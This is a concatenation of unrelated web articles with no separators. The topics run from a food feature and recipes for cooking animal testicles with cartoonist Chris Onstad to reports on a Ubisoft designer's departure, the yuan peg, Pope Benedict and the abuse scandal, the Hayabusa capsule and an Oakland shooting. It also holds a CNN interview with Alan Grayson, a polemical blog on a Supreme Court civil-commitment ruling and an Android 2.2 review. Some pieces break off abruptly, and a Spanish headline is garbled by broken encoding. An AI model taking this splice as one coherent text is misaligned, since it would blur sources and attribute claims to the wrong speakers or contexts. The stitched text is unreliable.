" I 'm kind of worried that before the night is done we 're going to pick up Thunderbird and grapefruit juice and see what that 's all about , " says Onstad .
It 's not apropos of nothing .
Earlier in the evening I 'd shown him an old Thunderbird ad from the 1970s on YouTube featuring a drink called the " Shake ' Em Up , " presumably meant to be consumed in small African American discos .
Sure enough , we 're soon off to the local bodega where he 's spotted Thunderbird before .
This kind of weirdness does n't appear uncommon for Onstad .
In fact it seems more like a necessity .
" At what point do you run out of everything that you know ? " he asks .
" You 've got to keep moving — like a shark .
How can a guy who just sits at his desk have anything to say ? "
Back at his house with his child asleep and the Thunderbird in the freezer , Onstad sets a pot of oil to heat on the stove .
Soon he 's dredging lemon wedges and onions in flour , getting ready to deep - fry .
It 's one of his favorite things to do in the kitchen , though he admits that he has a tendency to be lax in cleaning up the mess , making the fry party something of a special occasion .
That is , when he 's not frying for recipe development .
Lately he 's been at the stove perfecting his fried chicken technique .
" I 've done a ton of fried chicken this year , " he says .
" I found what makes fried chicken taste like you want it to taste like is Lawry 's seasoned salt . "
He just happens to have a packet of chicken thighs in the fridge so he can prove it .
What I 've got is more yak testicles , this time soaked in buttermilk and spices .
We drain them before tossing them in flour and dropping them into the hot oil .
We watch them bob up and down , bubbling in the hot liquid .
The wine has made us gregarious , and our cooking has become fearless .
That 's standard operating procedure in the Achewood Test Kitchen .
" I make each recipe at least five times in various states of inebriation , so I 've had at least one sober cooking experience , " says Onstad .
His fried chicken recipe will be a part of his new cookbook ( the Achewood Cookbook II ) , which he characterizes as a step up in skill level from his first book .
" The next book is for those who 've graduated .
So you know what the Maillard reaction is , or you have a knife so you 're not doing prep with a steak knife . "
The goal is to give as much information as possible , Onstad says .
" When I write these Achewood cookbooks I try to be , you know , meticulous .
Making sure you have as much help as possible , because if you look at any recipe , there 's a lot of gray area . "
Not for his fried chicken .
You know the size of the pot , how much oil to use and how long to fry on each side .
[ click here to see Onstad 's fried chicken recipe in an exclusive Achewood Cookbook II preview - ed ]
Unfortunately that 's not the case for our " oysters . "
Once out of the oil and cooled , I find very little to recommend them .
Onstad , on the other hand , seems pleased with the result .
But of all the testicle preparations , they are the only ones that have leftovers .
The experience does provide revelation :
The grassy , swampy yak testicles are for the truly hardcore , while buffalo testicles are much more approachable and subtle in flavor .
They are nothing compared to Onstad 's fried chicken , which is nearly perfect : tender and moist on the inside and super crisp on the outside , with a coating that does n't pull away from the meat on the first bite .
Our lesson is learned :
Where the balls fail , oil and thighs will prevail .
Tacos de Cojones
By the time we reach our last preparation , we 've drained four bottles of wine and I 've turned off the tape recorder .
The Thunderbird is mixed with ruby red grapefruit juice , shaken up and downed posthaste .
I make a small batch of masa tortillas , and we fry up the testes that I 'd rubbed with a spice mixture of cumin , garlic powder , sea salt , and a variety of dried chilies .
Liz bakes a batch of tiny cookies she calls Lavender Savoys for dessert .
The tacos come off without a hitch and are actually quite tasty .
Even the dog has ventured into the kitchen to see if she can catch a small nibble .
The warm drunkenness and sheer absurdity of the situation makes me feel for a moment that I 'm actually in Achewood , with Onstad playing all the principal characters at once .
It 's almost like getting a chance to take a spin around Pooh Corner in Christopher Robin 's upturned umbrella .
Except in this case , we'd be floating around a Southern California dreamland , in a souped - up muscle car , on an ever - expanding inland sea of Thunderbird and grapefruit juice .
Soon enough , having finished nearly two pounds of testicles , it 's time for us to part .
We venture into our separate nighttimes burping up the last vestiges of organ funk .
But while I sleep off a wine hangover , Onstad continues to scheme .
A few days later I receive an email :
" I am seriously considering a dessert based on Thunderbird .
Think cheap plum wine and a syrupy consistency .
It would probably make for a nice bread pudding or possibly an ice cream . "
Something to look forward to in the third Achewood cookbook , I hope .

The World 's Greatest Testicle Recipes
courtesy of Chris Onstad and Patrick Alan Coleman
Preparing Your Testicles for Action
Once you 've chosen the size and type of testicle you 'd like to prepare , take a moment to look them over and think about what you 're about to do .
While you ponder , set a pot of water to boil .
Once boiling , drop the testicles in the pot and parboil for five minutes .
Remove from the pot and cool under cold running water , until you can comfortably fondle them without being burned .
Using a sharp kitchen knife , make a shallow slice along the tough outer skin .
Carefully remove this layer from the delicate inner testicle meat .
It takes some practice .
It may help to run your knife between the skin and the meat , which once begun can help the skin peel away more easily .
Now with your testicles naked on the cutting board , you are ready to proceed .
Animelles en Persillade
1 large prepared testicle , cut into small chunks ( you can use any large animal testicle )
2 tablespoons butter
1 clove of minced garlic
1 chopped scallion
1 tablespoon chopped parsley
1 teaspoon salt
1 teaspoon fresh ground pepper
1 lemon wedge
In a small sauté pan , heat butter on medium high until foam subsides .
Add all ingredients and sauté until testicles turn a dark brown throughout , about 3 to 5 minutes .
Transfer with pan drippings to a serving plate and dress with a squeeze of fresh lemon .
Animelles en Persillade can also be added to a fresh watercress salad for an exciting mix of protein .
Shhh .
We can keep a secret .
Can you ?
Unhappy Family Jewels
1 large prepared testicle , cut into thin strips
1 tablespoon soy sauce
1/2 teaspoon cornstarch
1/2 teaspoon ginger
1 chopped scallion
1/2 teaspoon garlic
1/2 teaspoon peanut oil
1 tablespoon jalapeño
1 lemon wedge
In a small mixing bowl , add testicles , soy sauce , cornstarch , ginger , scallion , and garlic .
Preheat a well - seasoned wok on the stove with peanut oil .
When oil begins to shimmer , add jalapeños and fry until just tender .
Add testicle and soy mix to wok and fry .
Testicles will take very little time to cook .
While cooking a rich sauce should develop .
Serve cooked testicles over rice and dress with fresh lemon juice and soy sauce .
Ranch Tackle
1 large prepared testicle , cut into thin strips
1 1/2 cups buttermilk
1/2 tablespoon paprika
1/2 tablespoon sea salt
1/2 tablespoon ground pepper
1/2 tablespoon garlic powder
2 cups vegetable oil
1 cup flour
In a small bowl , add buttermilk , paprika , sea salt , pepper , and garlic powder .
Stir until combined .
Add testicles and soak in the refrigerator overnight .
Drain .
In a small saucepan , heat oil over medium high until oil is shimmering .
Put flour in a shallow dish .
Add testicles one by one until thoroughly coated .
Add coated testicles to hot oil and fry until they are golden brown and floating .
Remove from oil and drain on a wire rack .
Serve with french - fried potatoes , ranch dressing , and dill pickles .
Tacos de Cojones
For the taco meat :
1 large prepared testicle , cut into thin strips
1/2 tablespoon sea salt
1/2 teaspoon red pepper flakes
1/2 teaspoon fresh ground pepper
1 pinch of cumin
1 clove of minced garlic
1 teaspoon olive oil
Combine dry ingredients until mixed thoroughly .
Add minced garlic to mixture .
Gently rub testicles with the mixture , wrap in plastic wrap and let rest in refrigerator overnight .
When ready to prepare , heat oil in a small sauté pan and add testicles .
Fry until meat is brown throughout .
Add to fresh tortillas with your favorite salsa , fresh cilantro , and lime .
For the tortillas :
1 cup of masa corn flour
1/2 teaspoon sea salt
1/2 to 3/4 cup of hot water
Add sea salt to masa and mix thoroughly .
Slowly add hot water to masa , mixing with your hands .
Add only enough water so that the dough is not sticky .
It should be springy to the touch .
Let dough rest covered for one hour .
Once ready to cook , heat a griddle or any large flat pan .
Pinch off enough dough to make a one - inch ball .
Flatten with hands or tortilla press to desired thickness .
Cook each tortilla on the stove until top looks dry , flip and cook for a few seconds more .
Repeat until all dough is used .
Should yield four small tortillas .
Creative director Patrice Désilets has left Ubisoft and abandoned the best - selling Assassin 's Creed franchise , according to sources familiar with the situation .
Désilets has been with Ubisoft Montreal since its inception , working as a lead designer on the studio's early games like Hype : The Time Quest , a concept that originated from current EA Montreal studio manager Alain Tascan .
His development career broke into the mainstream when he played an instrumental part in the resurrection of the Prince of Persia franchise , working as creative director on the massively popular Sands of Time release for PlayStation 2 , Xbox , GameCube , and PC .
Building on his success , Désilets then played an essential role in the creation of Assassin 's Creed , a landmark new IP that has become the centerpiece of Ubisoft 's catalog .
Rather than wait to release the third installment after the highly successful sequel Assassin 's Creed II , Ubisoft announced plans to take the Activision approach to game development with yearly iterations of its most popular brands .
It is not currently known if this new direction affected Désilets ' decision making .
The Désilets departure is a huge blow to Ubisoft Montreal , which recently lost the services of Far Cry 2 creative director and Splinter Cell mastermind Clint Hocking .
Famed producer Jade Raymond , who also worked on Assassin 's Creed for the Montreal team , recently left to assume control of the new Ubisoft Toronto studio .
This could also undercut the public unveiling of Assassin 's Creed : Brotherhood at E3 next week .
Désilets may not have the mainstream recognition of other major game developers who have departed their studios this year , such as former Infinity Ward heads Jason West or Vince Zampella , but he certainly commands that level of respect in industry circles .
" I think there are three games that stand out above the rest of the pack in the remainder of this year .
One is Call of Duty Modern Warfare 2 , one is Uncharted 2 , and the third is Assassin 's Creed II , " Metal Gear creator Hideo Kojima told Famitsu last year in an interview translated by 1 Up .
" I think a lot of recent Western games concentrate on style and the ' you are there ' feel , but Patrice 's games are still focused squarely on game design .
The graphics have improved , but the system itself is a definite improvement over the last game .
I think there are very few sequels like that .
Any sequel needs to take in feedback from users and try to do what could n't be done last time , but with Assassin II , they worked really hard to advance the real core of the game , the way you assassinate people .
It 's really great . "
If Désilets chooses to stay in Montreal , he 'll have several studios from which to choose .
Warner Bros .
Interactive , which is led by former Ubisoft Montreal studio head Martin Tremblay , recently opened a Montreal office .
Electronic Arts and THQ also have studios that call the Canadian city home .
We contacted multiple Ubisoft employees for official comment on Désilets ' departure , but its public relations team would only respond with , " We do n't comment on rumor or speculation , " adding that they were unable to contact anyone at the studio .
UPDATE : Ubisoft responded to our story with the following statement : " With his role on project essentially done , Patrice Désilets has decided to take a creative break from the industry and is no longer working on Assassin 's Creed Brotherhood . "
El fiscal del Vaticano para los casos de abusos sexuales atribuidos a cl�rigos advirti� a los culpables que su condena en el infierno ser� peor que la pena de muerte
CIUDAD DEL VATICANO | S�bado 29 de mayo de 2010

NEW YORK , June 19 ( Reuters ) - China ’s decision to move away from its currency peg might mean the yuan weakens against the dollar instead of strengthens as Washington wants , Nouriel Roubini , one of Wall Street ’s most closely followed economists , said on Saturday .
China said on Saturday it would gradually make the yuan more flexible after pegging it to the dollar for nearly two years , a move that the U.S. government and others around the world have long been calling for .
“ This is the first significant signal in years of a change in Chinese currency policy , ” Roubini , best known for having predicted the U.S. housing meltdown , told Reuters .
But it remains to be seen how China would put the new system into practice including the composition of a basket of currencies that Beijing will use as a reference point for the yuan -- also known as the renminbi -- and the base date for that basket , he said in an e-mail .
“ Since they have not changed the previous range for the band -- plus or minus 0.5 percent -- most likely on Monday China will allow the renminbi vs U.S. dollar to move , ” said Roubini .
The yuan has risen sharply in recent months against the euro , which sank over Europe ’s debt problems , so a stronger yuan could not be taken for granted , he said .
If the euro were to continue to depreciate , “ the renminbi would have to be allowed to depreciate relative to the dollar , a paradoxical outcome , ” Roubini said .
His comments echoed those of an adviser to China ’s central bank on Saturday .
Li Daokui , an academic adviser to the monetary policy committee of the People ’s Bank of China , told Reuters in Beijing that the yuan could depreciate against the dollar if the euro falls sharply against the U.S. currency .
Roubini , like other analysts , said a major strengthening of the yuan looked unlikely .
“ Even if the Chinese were to allow a gradual renminbi appreciation relative to the U.S. dollar , the size of such appreciation would be modest over the next year , not more than 3 or 4 percent as the trade surplus has shrunk , growth is likely to slow down on China and labor / employment unrest remains of concern to the Chinese . ”
When Pope Benedict XVI announced the “ Year of the Priest ” that concluded Friday , he probably did n’t have in mind the sort of year he got .
He acknowledged as much in a closing Mass , telling more than 10,000 assembled priests in St. Peter ’s Square that “ in the very year of joy for the sacrament of the priesthood , the sins of priests came to light . ”
Benedict had been widely expected to use the occasion to issue his most sweeping and detailed mea culpa to date for the clergy sexual abuse scandal , and perhaps to announce new measures to cope with it .
The scandal has rocked the Roman Catholic Church in Europe this year , nearly a decade after it shook the American church to its roots .
But the pope did neither , blaming the problem on “ the enemy , ” Satan , even as he begged forgiveness from God and from the victims of priest abuse , as he has several times recently .
The latest comments failed to satisfy at least some in his audience , who called for greater accountability and more concrete measures to combat abuse .
“ How many times can you apologize before you take action ? ” asked Joelle Casteix of Newport Beach , a leader of the U.S. victims group Survivors Network of Those Abused by Priests , or SNAP , who attended the outdoor Mass .
Benedict celebrated the Mass in sweltering heat after presiding the night before over a vigil in which he strongly defended the church ’s requirement that priests take a vow of celibacy .
Although he has a reputation as an occasionally austere figure , the pope won praise from priests for speaking plainly and showing a keen understanding of their difficulties , as well as for inspiring them with reminders of the importance of their work and depth of their faith .
“ It ’s a challenge being a priest today , no ? ” Andres Ulloa , 24 , an Ecuadorean seminarian from Guayaquil , said after the Mass .
“ But he talked about the joys of being a priest ....
He knows how to get to the center and the essence of problems . ”
The pope ’s homily was delivered to a sea of men who wore white robes over black streetwear , looking decidedly uncomfortable on a hot , muggy day .
Together with the previous night ’s crowd , the gathering of Catholic priests was believed to be the largest in history .
The men fanned themselves and covered their heads with all manner of sun protection : fishing hats , straw hats , baseball caps ( some worn backwards ) , handkerchiefs — even paperback hymnals propped up like tents .
At one point , sounding much like the academic he once was , Benedict spoke of the development of monotheism , and seemed to criticize non-Christian faiths as well as the Enlightenment , the historical movement that brought revolutionary developments in science and philosophy .
He said that early in its development , monotheism embraced a “ distant ” God unlike the one worshipped by Christians .
“ This one God was good , yet aloof , ” the pope said .
“ Consequently , one did n’t need to worry about him . ”
Benedict spoke about “ the audacity of God ” in trusting men to be priests .
“ That God thinks that we are capable of this , that in this way he calls men to his service and thus from within binds himself to them — this is what we wanted to reflect upon and appreciate anew over the course of the past year , ” he said .
Although he did n’t announce any new measures to combat sexual abuse , he said the church must use “ the shepherd ’s rod , the rod with which he protects the faith against those who falsify it . ”
His abuse remarks drew applause at one point , and praise by priests afterward .
However , the comments of some clerics served as reminders that the scandal is not entirely global .
Benjamin Ogechi Agbara , a diocesan priest from Port Harcourt , Nigeria , said he was satisfied with the pope ’s comments but that sexual abuse was secondary in his country .
“ The problem of the church , ” he said , “ is poverty in Africa . ”
The pope ’s comments did not appease organized groups of abuse victims who have called for more substantive action .
Anne Barrett Doyle , co-director of BishopAccountability.org , issued a statement calling Benedict ’s remarks “ a great disappointment and a squandered opportunity . ”
Casteix and several other representatives of SNAP were also critical .
Casteix , SNAP ’s Southwest director , said she would not be satisfied until the church instituted a zero - tolerance policy under which abusive priests and those who covered up their crimes were turned over to civil authorities and expelled from the church .
( Benedict has called for all sexual abusers to be turned over to police . )
Priests might have been inspired by the gathering at the Vatican , Casteix said , but the pope did n’t give them any tools with which to deal with the problem .
“ They leave here and what do they really have ? ” she asked .
“ Nothing .
Inspiration does n’t really save a child . ”

The coming renewed media storm about AGW , or anthrogenic Global Warming , should be ignored .
Global warming is a surrogate for us talking about the real environmental crime — ecocide .
The real threat to nature is disruption of ecosystems and through that , disruption of breeding cycles which reduces the amount of animals in any given population below safe breeding levels .
They then die out slowly .
We ’ve been seeing this happen for years .
The more roads we put down , fences we put up , pollution we dump into the atmosphere and land we use , the less space for animals to live — which requires per animal a certain amount of roaming , breeding , feeding , hunting , foraging acreage as well as a much small space for its domicile .
If we want to “ save nature , ” we need to use less space and leave at least 35 % of our land in every climactic zone for nature unmolested .
No roads , no fences .
Not farmland , not national park , not “ managed green . ”
Natural land with no human intervention .
Setting aside land like this would create natural carbon sinks in the forests and swamps that have been absorbing and subsuming biological carbon for aeons , gradually turning it into petrochemicals .
It would inconvenience us , especially “ the little guy ” who might want a weekend home or hunting lease or to start some crazy business in the woods .
However , it ’s the only real solution — everything else is a band - aid .
For these reasons , this blog advocates conservationism and not environmentalism .
There is only one environmental issue : how much land we set aside that ’s not for our use , but for nature alone .
Everything else ( recycling , overpopulation , pollution , driving a Prius while smoking cigars ) is a subset of that one major issue .

Image caption Work begins on the Hayabusa capsule at the Sagamihara Campus
Japanese scientists have begun to open the Hayabusa asteroid capsule .
The canister , which returned to Earth on 13 June , is being worked on at the Japanese space agency 's ( Jaxa ) Sagamihara Campus in Kanagawa .
It is hoped the vessel will contain small amounts of dust grabbed from the surface of asteroid Itokawa by a spacecraft in 2005 .
Researchers said they had already detected a trace gas in the capsule but had yet to identify it .
" We still do n't know exactly what kind of gas it is , but the researchers confirmed a trace of low - pressured gas in the capsule , " a Jaxa official told AFP .
One of the scientists ' key tasks is to make sure the vessel is handled in perfectly sterile conditions .
They have to be certain that any substances they recover are extraterrestrial and not merely Earthly contamination .
It is expected to take at least a week to properly open the capsule to get access to its sample containment box .
Scientists say any residues could give them new insights into the early history of the Solar System and the materials that went into building the planets .
" If the capsule contains fragments of at least 10 microns ( thousandths of a millimetre ) , researchers can make an analysis , " the Jaxa spokeswoman said .
The capsule 's return two weeks ago marked the culmination of a remarkable seven - year adventure , which saw the Hayabusa mission spend three weeks orbiting asteroid Itokawa and attempt to pluck dust from its surface .
The $ 200 m mission encountered many technical problems , from being hit by a solar flare to experiencing propulsion glitches .
But each time an issue came up , the Japanese project team found an elegant solution to keep Hayabusa alive and bring it back to Earth - albeit three years late .
The sample capsule fell safely to Earth in Australia thanks to its heat - shield and a parachute .
The main Hayabusa spacecraft , however , was destroyed on re-entry to the atmosphere .

Congressman Alan Grayson has filed a formal complaint with the Florida Department of Health and the Florida Medical board after a voter in his district sent him a picture of this -- Pissed - off Florida urologist to Obama supporters :
Go somewhere else .
Par for the course Anderson Cooper questioned Rep. Grayson 's motives with filing the complaints .
COOPER : Democratic Congressman now Alan Grayson .
A woman whose daughter took a picture of the sign sent it to the congressman complaining .
He 's filing a formal complaint with the Florida Department of Health and the Florida Medical Board .
Congressman Grayson joins us now .
You -- does it make sense , what the doctor is saying ?
I mean , he 's claiming he 's not turning any patients away .
REP .
ALAN GRAYSON : He 's a very confused individual .
That much is obvious .
But what he 's doing clearly is a violation of the ethics rules that you cited earlier , the Hippocratic oath , the rules of the AMA .
And it's at the expense of his patients and care .
What he 's doing is no different from saying , " I will not treat a black person .
I will not treat a Catholic . "
I thought that we , as a country , has moved beyond that .
COOPER : But wait a minute .
Wait a minute .
Wait a minute .
Wait a minute .
Wait a minute .
I mean , I 'm not taking a side .
I 'm not taking anybody 's side in this , but , just for accuracy 's sake , he has said nothing about race .
And race is a protected category .
I mean , there are -- it is illegal to discriminate someone based on race .
It is not illegal to say you do n't want to treat somebody because you do n't like their politics .
Politics is not a protected class .
GRAYSON : Well , in fact , where he lives , in Mount Dora , which is in my district , many , many of the Democrats who live in Mount Dora happen to be African - Americans .
So , by saying that he will not treat somebody who supported Obama , he 's saying that he's not going to treat a large number of African - Americans in the community .
COOPER : Wait .
So , you 're saying race is at the core of this ?
Come on .
There is no evidence of that at all .
GRAYSON : No , I 'm saying -- I 'm saying that it shows very poor judgment .
And the effect of this -- the effect of this is to set us back as a country .
That 's why I 'm disgusted by it .
COOPER : But , again , he 's not doing anything illegal .
GRAYSON : Well , that remains to be seen .
You know , he 's licensed .
There are licensing authorities who are going to look into what he 's doing .
And I hope that they will take action , because , frankly , I think a lot of people are disturbed just to go into his office .
He 's turned his inner office , his reception area , into some shrine of right - wing nuttery .
And he said earlier today on FOX News that he 's upset about the health care bill because it means that old people wo n't able to go to nursing homes anymore .
COOPER : Critics of you , though , will say , well , look , this comes across as a partisan attack , that you 're using the legal system , or the medical ethics system , to pressure someone who does n't agree with you .
GRAYSON : Well , that 's not true .
COOPER : I mean , if this was an Obama supporter who put up a sign saying , " I do n't like Republicans , and Republicans should go elsewhere , " would you be as outraged ?
GRAYSON : I 'm protecting the people in my district who deserve medical care , even if they happen to have voted for Obama .
COOPER : Nobody , though , seems to be alleging that he treats any of his patients any differently based on what they believe .
I mean , so far , no one has said that their care has suffered because they were an Obama supporter .
GRAYSON : How many people walked in -- walked up to his front door , saw the sign , and turned away ?
How many people referred from other physicians in the community , including primary care physicians , how many patients saw that sign and walked away ?
COOPER : What kind of penalty do you think he should get ?
GRAYSON : Well , whatever the medical authorities think he should get .
But it is a clear violation of ethics , and it's a particularly ugly one .
Why is it that the right wing is so preoccupied with denying people health ?
Why is that ?
COOPER : Representative Alan Grayson , appreciate you being on for your perspective .
Thank you very much .
GRAYSON : Thank you .
Transcript via CNN .
Washington ( CNN ) --
The U.S. Supreme Court ruled Monday the federal government has the power to keep some sex offenders behind bars indefinitely after they have served their sentences if officials determine those inmates may prove " sexually dangerous " in the future .
... At issue was the constitutionality of federal " civil commitment " for sex offenders who are nearing the end of their confinement ...
The Court holds today that Congress has power under the Necessary and Proper Clause to enact a law authorizing the Federal Government to civilly commit " sexually dangerous person [s ] " beyond the date it lawfully could hold them on a charge or conviction for a federal crime .
18 U. S. C. § 4248 ( a ) .
I disagree .
The Necessary and Proper Clause empowers Congress to enact only those laws that " carr[y ] into Execution " one or more of the federal powers enumerated in the Constitution .
Because § 4248 " Execut[es ] " no enumerated power , I must respectfully dissent .
( Thomas ) Unless the end itself is " legitimate , " the fit between means and end is irrelevant .
In other words , no matter how " necessary " or " proper " an Act of Congress may be to its objective , Congress lacks authority to legislate if the objective is anything other than " carrying into Execution " one or more of the Federal Government 's enumerated powers .
" The court 's holding today is a victory on behalf of the American people , " said Sen. Patrick Leahy , D - Vermont , chairman of the Senate Judiciary Committee .
" The process to enact this law to protect our children from those who would do them harm was difficult .
I am heartened to see an overwhelming majority of the Supreme Court uphold this important child protection law . "
Let 's dispense with CNN - soundbite analyses of the case .
Not even close .
This is n't about sex offenders .
This is the Supreme Court , not your local public defender / bench trial farce pretending to be justice .
And it is n't " by extension " about the indefinite detention of terror suspects .
It is n't about whether it is ok to civilly commit criminals after they 've served their time .
This is something I am against , can argue it classically , drunkenly , or violently , your choice , but regardless , is n't really the point .
The question here was whether theis allowed to engage in civil commitments for anything other than the enforcement of ( federal ) criminal law .
More generally , is the federal government allowed powers it thinks important , not explicitly granted by the constitution , but not specifically prohibited either ?
And , is the Supreme Court going to let them ?
The answer is , yeah , pretty much .
II .
Thomas , first two sentences of his dissent :
All extra power that may be needed by the government isgranted to the states .
That 's the whole Federalist set up .
" The powers not delegated to the United States by the Constitution , nor prohibited by it to the states , are reserved to the states . "
That 's the whole point .
The government already does lots of things outside its enumerated powers .
It builds prisons .
It can declare a quarantine .
It gets away with these because they are closely related to actually enumerated powers .
The test is whether the desired power / law -- is " necessary and proper " and also " legitimate , " as defined as " within the scope of the Constitution . "
But the two parts of the the test must be equally considered .
You can be for Big Government or you can be against it .
Whatever , it matters not a lick .
It matters GIGANTICALLY that the supposedly conservative , strict constructionist Chief Justice , a man who had previously been in a tennis club actually called -- has come down decidedly on the side of , " well , I guess in some cases it 's ok ...
" Say what you want about Scalia and Thomas , but undeniably , they are old .
They will die .
If they were the only two willing to put pen to paper against a government looking to expand its powers , look out .
III .
Listen , dummy , you have it backwards .
All constitutional questions aside , the practical outcome of this is that it puts a criminal matter into the hands of the psychiatrists .
Is that what you want ?
Worse : it places the prediction of a future crime in the hands of the psychiatrists .
Worse still : it places the prediction of a future crime on the basis of not having actually committed any crimes yet in the hands of the psychiatrists .
Note that one of the defendants did n't actually molest anyone , he only had child porn .
Is hentai child porn ?
Well , it is now .
Is raping a child a mental illness ?
Not is it evil , not is it curable , I 'm asking if it represents a discrete pathology ?
How is a psychiatrist to intelligently predict dangerousness there ?
What if he gets it wrong -- in either direction ?
In an ordinary psychiatric commitment , I have to predict whether this guy 's mental illness may cause him to be dangerous .
Note carefully : not predict if he is dangerous , but whether that dangerousness is the direct result of a mental illness .
If I think a guy is going to shoot a rival gang member , locking him in a hospital is n't allowed .
So ?
He raped a child last week .
He exhibited no signs of that behavior previously , and he does n't have any now .
So ?
IV.I 've nearly had it with this country , with this generation .
Forget about being responsible for yourself , people are not even willing to be responsible for choosing someone else to bear the responsibility .
Do n't bother me .
So long as I can Facebook all night and not have to have sex with my spouse .
The government , not just Obama , Bush too -- is the manifestation of this narcissism and laziness .
On the one hand , the government wants all the power in the world to do what it thinks is right , the other half of the country be damned .
And we say , sure !
just drop me off at Nordstroms , it 's on the way .
On the other hand , anything it finds politically toxic it offloads to the group with no scientific rigor and no ethical framework beyond expediency .
Got poverty ?
You can apply for welfare and disability down at the community mental health clinic .
Got criminality ?
They have a branch office in the jails , too .
Whenever you hear about Chinese schoolkids getting slashed or Japanese teenage hikikomori masturbating to bootlegs of , it seems only logical to wonder , hey , what 's up with that crazy culture ?
So I put it to you : you got an epidemic of pedophiles - or you have a media created fantasy of an epidemic of pedophiles ; for which the government response in either case is a ) more powers for us ; b ) more psychiatry for you .
What 's up with that crazy culture ?---
There has been a lot of speculation about the features of Android 2.2 , codenamed “ Frozen Yogurt ” or “ Froyo ” for short .
I have been fortunate enough to have had plenty of time to work with a 2.2 device , using it as my day - to - day smartphone .
Now that Froyo has been announced at Google IO , lifting the embargo on the non-disclosure agreement of what Android 2.2 brings to the general public , we are bringing you some notes on the new features I have been taking for granted for the past few weeks .
Quick update from the Android Blog : " Android 2.2 will be here soon , and some devices will get the update in the coming weeks . "
More official notes can be found here .

This following part of the write - up is based on a developer release of Android 2.2 Froyo and does n't include some of the features announced at Google I /O , listed above .
It looks like some features were not disclosed at the conference , such as the color trackball and car dock enhancements .
New Feature : Speed
As we previously reported , Froyo got quite a speed boost , which is due to the Just - In - Time compiler .
I ’ve benchmarked the Nexus One as high as 39 - and - change MFLOPS since our original post .
Another benchmark I ’ve been able to determine though : boot time is much faster .
I clocked the Froyo - based Nexus One from first logo sequence through network connection in 72 seconds .
My Android 2.1 Nexus
One took over 120 seconds ( two minutes ) to fully boot and be ready for use .
Similar apps are installed on both devices to keep this benchmark fair .
New Feature : Adobe Flash Support
This has been covered by Adobe and several other sites .
Adobe has even gone to the trouble of compiling several mobile - friendly sites for major devices such as the Nexus One , Palm Pre and Motorola Droid which will lead users to web sites utilizing Flash .
It ’s uncertain yet when Flash 10.1 will be fully released ; speculation is June 2010 .
The one feature on my Nexus One with Android 2.1 , that I missed from my brief time using an iPhone , was the ability to launch an update process on several apps at one time .
4 taps per app to update them was time - consuming and frustrating .
I am happy to say that Android 2.2 makes this functionality a reality , and here are the screenshots taken from my Nexus One :
From the screenshots above , we can see the new “ Update all ” button at the bottom of the Downloads panel of the Android Market .
It ’s important to note that the button only appears if you have multiple apps that do not need a * manual * update like the Bible reader which requires a permission change .
The second screenshot shows you an alert dialog which says :
Permissions changed Permissions have changed for 1 of 7 apps with updates available .
Press OK to update 6 apps with no permission changes .
Please open remaining apps from the Downloads list to approve new permissions and start update .
OK / Cancel
Tapping the OK button begins the download process , as seen in the third screenshot .
Once the apps have started downloading , you can exit the Market and multitask .
If you pull down the Notification bar at the top of the screen , you can get an update of which apps are still downloading , as seen in the fourth screenshot .
If several apps have permission changes , you will only see the “ Update all ” button if multiple apps need an update that do NOT have permission changes to review :
Froyo also includes the means to let the user flag individual apps for auto- updates , provided that the permissions of the app do not change .
New Feature : USB and Wifi Tethering
This has already been covered here at AndroidPolice.com .
Android 2.2 will allow a device to act as a WiFi Hotspot , and also allow USB tethering to a computer to provide a single device with Internet access .
I was unable to determine how many devices could connect to the hotspot , and the developer version of Android 2.2 only had ‘ Open ’ wifi working ; the only option for encrypted wifi was WPA2 - SPK and was not working properly .
New Feature : Colored Trackball
Though custom ROM builds such as Cyanogen have been doing this for a while , this is neat eye candy .
This feature , of course , applies to the Nexus One , but other devices may gain some new comparable feature .
While new Email and SMS notifications still cause the trackball to glow white , installing Twidroid showed a neat new feature : a BLUE trackball when a new tweet was downloaded -- talk about color / brand tie -in !
There does not seem to be any means to let the user customize the trackball color within the operating system .
While this may not be earth - shattering , Froyo has added some friendlier screens within the OS which new users may appreciate .
Dare to compare : Android 2.1 :
And on Froyo :
The first photo gives you a friendlier message about USB connectivity , and a second screen with an Android mascot of a different color with a warning to ‘ eject ’ the device from your computer first .
It ’s important to note that the user still has to manually pull down the Notification bar and tap the icon to connect via USB .
Froyo updated the layout of the Car Home app when the Nexus One is placed in the Google Car Dock .
The Android 2.1 screen looked like this :
And the new Froyo screen looks like this :
Main changes :
The Directions button is the same as the View Map button from 2.1 , and you can access Navigation from within the Google Maps app that gets launched .
Added a Music icon
Added a Phone icon
Removed the text search icon
Modified the Home button with an Exit Car Mode button
Other changes I noted was that once you exit Car Home mode , tapping the Home button on the Nexus One does not return you to Car Home mode , it keeps you at the basic Android desktop ; you need to manually restart the Car Home application .
It was also a nice surprise to see that while in the Google Car Dock , the main Android Desktop is also rotated , something that 2.1 was not capable of .
Two young men were killed and four women were injured , one critically , after a gunman opened fire early Sunday in a West Oakland warehouse that had been converted into an unlicensed music club , police said .
The shots rang out at 2:45 a.m. after a CD release party in a building of corrugated metal that has no sign but is known as The Ware House , at 34th and Chestnut streets near the California Hotel .
Guests at the event - which was scheduled to run from 10 p.m. to 2 a.m. and had been publicized on flyers and the Internet - celebrated a CD by Oakland hip - hop artist Zulu the King .
The performer , otherwise known as Xavier Lowery , said the release party ended peacefully and he left the warehouse to get something to eat .
By the time he returned to socialize , he said , the assault had happened .
" I feel bad for the families , " said Lowery , 28 .
" How do these mothers feel when their child is not coming to see them for Mother 's Day ?
It 's these senseless acts of violence we do n't need . "
Oakland police said a 19 - year - old man from Oakland and a 24 - year - old man from Modesto were pronounced dead at the scene by paramedics .
None of the victims has been identified .
A 36 - year - old woman was taken by ambulance to Highland Hospital in Oakland in critical condition , said Officer Holly Joshi , a police spokeswoman .
She said three other female victims , two who are 20 and one who is 21 , transported themselves to the hospital and are expected to survive .
Police have not released any details about the suspect or suspects or determined a motive for the shooting .
While saying the venue was unlicensed , she said she did not know if anyone affiliated with it would face punishment .
Efforts to reach the building owner were unsuccessful .
Adam Ivey , a jazz musician who rents studio space in the building , was in another room when he heard shots fired and described the ensuing scene as pandemonium .
" I do n't know exactly what went bad but I heard stories about it being a turf war , " said Ivey , 29 , of San Leandro .
" I 've never experienced anything like this firsthand . "
Ivey said the warehouse had the potential to be a gathering place for people in the neighborhood to play and learn music .
Recently , he said , the facility hosted a birthday party for a 13 - year - old boy .
" When you try to do something positive and you get this kind of result , it 's really sickening , " he said .
Anyone with information about the shooting is asked to call the Oakland police homicide section at ( 510 ) 238-3821 .
The large lecture hall of the French Institute in Barcelona is full to overflowing .
People line the walls , sit in the aisles and stand three - deep at the back .
